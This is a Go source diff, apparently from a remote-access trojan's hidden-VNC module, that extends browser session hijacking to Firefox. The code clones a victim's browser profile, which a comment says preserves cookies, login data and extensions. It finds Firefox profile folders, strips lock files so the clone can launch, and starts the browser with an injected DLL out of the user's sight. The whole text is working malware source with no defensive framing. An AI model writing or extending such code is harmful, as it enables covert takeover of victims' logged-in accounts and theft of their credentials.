@@ -166,10 +166,25 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 	}
 	log.Printf("hvnc %s: cloned profile to %s", info.name, cloneDir)
 
-	for _, lockFile := range []string{"SingletonLock", "SingletonCookie", "SingletonSocket"} {
-		lp := filepath.Join(cloneDir, lockFile)
-		if err := os.Remove(lp); err == nil {
-			log.Printf("hvnc %s: removed lock file %s", info.name, lockFile)
+	if info.isFirefox {
+		for _, lockFile := range []string{"parent.lock", "lock"} {
+			filepath.Walk(cloneDir, func(path string, fi os.FileInfo, err error) error {
+				if err != nil || fi.IsDir() {
+					return nil
+				}
+				if strings.EqualFold(fi.Name(), lockFile) {
+					os.Remove(path)
+					log.Printf("hvnc %s: removed lock file %s", info.name, path)
+				}
+				return nil
+			})
+		}
+	} else {
+		for _, lockFile := range []string{"SingletonLock", "SingletonCookie", "SingletonSocket"} {
+			lp := filepath.Join(cloneDir, lockFile)
+			if err := os.Remove(lp); err == nil {
+				log.Printf("hvnc %s: removed lock file %s", info.name, lockFile)
+			}
 		}
 	}
 
@@ -187,6 +202,7 @@ type browserInfo struct {
 	exePaths   []string // candidate exe locations (env vars expanded at runtime)
 	userData   string   // relative to LOCALAPPDATA (or APPDATA for Firefox)
 	useAppData bool     // true = use APPDATA instead of LOCALAPPDATA
+	isFirefox  bool     // true for Firefox (different profile structure)
 }
 
 var browserInfoMap = map[string]browserInfo{
@@ -222,6 +238,7 @@ var browserInfoMap = map[string]browserInfo{
 		},
 		userData:   `Mozilla\Firefox`,
 		useAppData: true,
+		isFirefox:  true,
 	},
 }
 
@@ -346,6 +363,15 @@ func getBrowserUserDataDir(info browserInfo) string {
 	return ""
 }
 
+// isFirefoxProfile checks if a directory name matches Firefox profile naming convention.
+// Firefox profiles have names like "xxxxx.default-release", "xxxxx.default-esr", etc.
+func isFirefoxProfile(name string) bool {
+	lower := strings.ToLower(name)
+	return strings.Contains(lower, ".default-release") ||
+		strings.Contains(lower, ".default-esr") ||
+		strings.Contains(lower, ".default")
+}
+
 // cloneBrowserProfile clones the browser user data directory, skipping only
 // large cache directories that aren't needed for a functional session.
 // This preserves extensions, cookies, login data, local storage, etc.
@@ -432,13 +458,31 @@ func cloneBrowserProfile(browserName string, srcUserData string, lite bool, onPr
 		jobs = append(jobs, copyJob{src: src, dst: dst})
 	}
 
+	// Get browser info to check if it's Firefox
+	isFirefox := false
+	for _, bi := range browserInfoMap {
+		if strings.EqualFold(bi.name, browserName) {
+			isFirefox = bi.isFirefox
+			break
+		}
+	}
+
 	for _, entry := range entries {
 		name := entry.Name()
 		src := filepath.Join(srcUserData, name)
 		dst := filepath.Join(cloneBase, name)
 
 		if entry.IsDir() {
-			isProfile := strings.EqualFold(name, "Default") || strings.HasPrefix(name, "Profile ")
+			// Check if this is a profile directory
+			isProfile := false
+			if isFirefox {
+				// Firefox profiles have names like "xxxxx.default-release"
+				isProfile = isFirefoxProfile(name)
+			} else {
+				// Chrome-based browsers use "Default" or "Profile X"
+				isProfile = strings.EqualFold(name, "Default") || strings.HasPrefix(name, "Profile ")
+			}
+
 			if isProfile {
 				collectProfileDir(src, dst, skipDirs, collectFile)
 			} else if !skipDirs[strings.ToLower(name)] {
@@ -548,11 +592,24 @@ func calcCloneSize(srcUserData string, skipDirs map[string]bool) int64 {
 	if err != nil {
 		return 0
 	}
+
+	isFirefox := false
+	if strings.Contains(strings.ToLower(srcUserData), "mozilla\\firefox") ||
+		strings.Contains(strings.ToLower(srcUserData), "mozilla/firefox") {
+		isFirefox = true
+	}
+
 	for _, entry := range entries {
 		name := entry.Name()
 		p := filepath.Join(srcUserData, name)
 		if entry.IsDir() {
-			isProfile := strings.EqualFold(name, "Default") || strings.HasPrefix(name, "Profile ")
+			isProfile := false
+			if isFirefox {
+				isProfile = isFirefoxProfile(name)
+			} else {
+				isProfile = strings.EqualFold(name, "Default") || strings.HasPrefix(name, "Profile ")
+			}
+
 			if isProfile {
 				total += calcProfileSize(p, skipDirs)
 			} else if !skipDirs[strings.ToLower(name)] {
